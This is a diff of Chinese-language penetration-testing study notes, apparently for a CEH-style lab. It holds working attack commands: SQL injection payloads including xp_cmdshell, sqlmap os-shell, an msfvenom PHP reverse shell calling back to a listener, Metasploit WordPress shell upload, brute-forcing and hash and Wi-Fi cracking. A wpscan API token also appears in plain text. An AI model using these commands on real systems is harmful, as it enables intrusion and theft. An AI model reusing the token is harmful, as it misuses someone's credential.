@@ -8,7 +8,7 @@
 | 135 | TCP | RPC Endpoint Mapper |
 | 137/138 \* | UDP | NetBIOS |
 | 139 \* | TCP | NetBIOS |
-| 389 | TCP/UDP | LDAP |
+| 389 | TCP/UDP | LDAP（DC） |
 | 445 | TCP | SMB |
 | 464 | TCP/UDP | Kerberos password change |
 | 636 | TCP | LDAP SSL |
@@ -28,15 +28,6 @@
     - strings XX.bin
 - 取得圖片檔之metadata
     - exiftool XXX.png
-- 利用nmap找到主機群port的資訊
-    - nmap -sVC IP
-- nmap找snmp
-    - nmap -sU -p161 IP
-- 取得snmp資訊，並得知使用者帳號清單
-    - 方法一：
-        - snmp-check IP
-    - 方法二：
-        - nmap -sU -p161 --script snmp-win32-users IP
 - 利用取得帳密列舉smb相關資訊
     - enum4linux -u USER -p PASSWORD -a IP
 - 取得網段內netbios的資訊
@@ -57,6 +48,44 @@
     - adb shell
     - sudo -
     - adb pull /sdcard (將/sdcard的資料download下來)
+
+**列舉SNMP**
+
+- 利用nmap找到主機群port的資訊
+    - nmap -sVC IP
+- nmap找snmp
+    - nmap -sU -p161 IP
+- 取得snmp資訊，並得知使用者帳號清單
+    - 方法一：
+        - snmp-check IP
+    - 方法二：
+        - nmap -sU -p161 --script snmp-win32-users IP
+- 暴力列舉SNMP
+    - nmap -sU -p161 --script snmp-brute
+- 利用metasploit
+    - use scanner/snmp/snmp\_login
+    - use scanner/snmp/snmp\_enum
+    - set rhosts [10.10.10.10](https://10.10.10.10) [10.10.10.16](https://10.10.10.16)
+    - run
+
+列舉NetBios
+
+- nbtstat –A [10.10.10.16](https://10.10.10.16) (在windows)
+
+用Enum4Linux列舉的方法
+
+- enum4linux -u martin -p apple -U 10.10.10.12 -&gt; Users Enumeration
+- enum4linux -u martin -p apple -o 10.10.10.12 -&gt; OS Enumeration
+- enum4linux -u martin -p apple -P 10.10.10.12 -&gt; Password Policy Information
+- enum4linux -u martin -p apple -G 10.10.10.12 -&gt; Groups Information
+- enum4linux -u martin -p apple -S 10.10.10.12 -&gt; Share Policy Information (SMB Shares Enumeration)
+- enum4linux -u USER -p PASSWORD -a IP
+
+Nikto之使用於弱掃
+
+- nikto -h http://www.goodshopping.com -Tuning 1
+- nikto -h [http://www.goodshopping.com](http://www.goodshopping.com) -Tuning 1 的意思是讓 Nikto 對 [http://www.goodshopping.com](http://www.goodshopping.com) 執行掃描，僅檢查是否存在敏感或有趣的文件（例如，可能被錯誤暴露的備份文件或日誌文件）。
+- 
 
 **在OS裡找檔案及找尋字串**
 
@@ -130,6 +159,7 @@
 **SQLMAP之SQL注入攻擊法**
 
 - 針對MSSQL Web之隱碼攻擊
+    - wapiti -u &lt;url&gt; [-m sql] -&gt;This Will give the vulnerable parameter
     - 先登入並且取得cookie
     - sqlmap -u "url" --cookie="" --dbs
         - 變型，讓sqlmap自己去找插入點：
@@ -139,6 +169,21 @@
     - sqlmap -u "url" --cookie="" -D XXX -T DDD --dump --technique=B (technique=B表示用盲目攻擊方式)
 - 找到某個參數網頁
     - [http://aa.bb.com/?cid=99](http://aa.bb.com/?cid=99)
+- 進入OS－Shell
+    - sqlmap -u "[http://www.example.com/viewprofile.aspx?id=1](http://www.example.com/viewprofile.aspx?id=1)" --cookie="cookies xxx" --os-shell
+    - 用whoami:
+        - ommand standard output: 'nt service\mssql$sqlexpress'
+
+**SQL Injection**
+
+- 可以跳過login
+    - blah' or 1=1 --
+- 插入一個值
+    - blah';insert into login values ('john','apple123');
+- 建立DB
+    - blah';create database mydatabase;
+- 執行程式
+    - blah';exec master..xp\_cmdshell 'ping www.moviescope.com -l 65000 -t'; --
 
 **命令注入攻擊法**
 
@@ -169,18 +214,20 @@
 - 使用whatweb取得web的相關資訊
     - whatweb [http://111.1.1.1/ceh](http://111.1.1.1/ceh)
 - 以whatweb知道該網站為wordpress的網站後，可以再用wpscan取得使用者
-    - wpscan -url [http://1.1.1.1](http://1.1.1.1) -e u
+    - wpscan --url [http://1.1.1.1](http://1.1.1.1) -e u
 - 再以wpscan破密
-    - wpscan -url [http://1.1.1.1](http://1.1.1.1) -P password-wordlist
+    - wpscan --url [http://1.1.1.1](http://1.1.1.1) -P password-wordlist
 - wpscan API Token
     - skfQiBi5IJDMK440vro4rJ1sUcHFNPmJDYREBuK2akk
 - wpscan --url http://10.10.10.16:8080/ceh --api-token skfQiBi5IJDMK440vro4rJ1sUcHFNPmJDYREBuK2akk -P /usr/share/wordlists/nmap.lst
 - 使用wpscan並且加上API Key得知漏洞
 
-以Metasploit來攻擊WordPress
+**以Metasploit來攻擊WordPress**
 
+- msfdb init
 - sudo service postgresql start
 - msfconsole
+- msf&gt; db\_status
 - 可以使用search來進行查找
 - search description:wordpress -o 123.csv (找尋description欄位內wordpress的值，並且進行輸出到123.csv檔案)
 - use exploit/unix/webapp/wp\_admin\_shell\_upload
@@ -204,6 +251,32 @@
     - sessions ID， 如sessions 2，表示進入第2個session
     - exit 離開session
 - back 回去上一個選項
+
+**使用Metasploit來列舉**
+
+- nmap -sS -A XXXXX -oX TEST
+- msfdb init
+- service postgresql start
+- msfconsole
+- 以DB來列舉
+    - &gt; db\_status
+    - &gt; db\_import TEST
+    - &gt; hosts
+    - &gt; services
+    - &gt; db\_nmap -sS -A IP
+- 列舉SMB
+    - &gt; use scanner/smb/smb\_version
+    - &gt; set rhosts [10.10.10.1-10](https://10.10.10.1-10)
+    - &gt; set threads 100
+    - &gt; run
+
+**使用hping3來列舉Ports**
+
+- sudo hping3 --scan 1-3000 -S [10.10.10.10](https://10.10.10.10)
+- sudo hping3 -c 3 [10.10.10.10](https://10.10.10.10)
+- sudo hping3 [10.10.10.10](https://10.10.10.10) --udp --rand-source --data 500
+- sudo hping3 -S [10.10.10.10](https://10.10.10.10) -p 80 -c 5
+- 
 
 **分析Modbus**
 
@@ -280,6 +353,7 @@ HASH處理(Windows)
 - WPA2加密協定
     - aircrack-ng WPA2crack-01.cap -w /usr/share/wordlists/nmap.lst
     - -w 後面接word lists
+    - aircrack-ng -b &lt;bssid from wireshark&gt; -w &lt;path to word list&gt; &lt;pathto pcap file&gt;
 
 **Windows 萬用加解密程式**
 
@@ -312,6 +386,7 @@ HASH處理(Windows)
 - 如要分析web form，則可以在：
     - Statistics/Protocol Hierarchy/HTML Form URL Encoded
     - 可以看到web form內使用者輸入的資訊
+    - http.request.method == “POST” -&gt; Wireshark filter for filtering HTTP POST request
 - 要重組TCP Stream，則：
     - 點選任一封包項目
     - 點Follow-&gt;TCP Stream，接下來可以在show and save data as "Hex Dump"，將資料下載下來
@@ -364,6 +439,40 @@ HASH處理(Windows)
 
 - 去cyberchef進行
 
+FTP傳檔
+
+- ftp IP
+- 用hydra取得帳密
+- get XXX.txt
+
+如何使用smbclient指令來存取SMB
+
+- smbclient //10.10.10.10/XXXXXX -U admin
+- smbclient -L 10.10.10.10 -U admin 可以看到所分享出來的目錄
+- get file.txt ~/Download/file.txt 用來取得檔案
+
+如何進行Reverse TCP
+
+- msfvenom -p php/meterpreter/reverse\_tcp LHOST=10.10.10.13 LPORT=4444 -f raw -o exploit.php
+- 將exploit.php檔案上傳到網站
+- msfconsole
+- use exploit/multi/handler
+- set payload php/meterpreter/reverse\_tcp
+- set lhost
+- run
+- 透由browser去瀏覽該PHP檔案
+- search -f "\*.png"
+- download file.txt
+
 **其它**
 
 - 利用Detect It Easy（DIE）去分析執行檔
+- 取得Windows 使用者之SID
+    - wmic useraccount get name,sid
+- 在parrot裡用Remmina連windows RDP
+- nmap -Pn - -script vuln &lt;IP&gt; 用來進行基本弱掃
+- 在parrot裡用下面指令處理base64
+    - base64 -d &lt;File&gt; -&gt; 解碼
+    - base64 &lt;File&gt; &gt; 111.txt -&gt; 編碼
+- 使用hastcat來解開hash
+    - hashcat -a 0 -m 0 &lt;hash file&gt; &lt;wordlist&gt; --&gt;raw md5
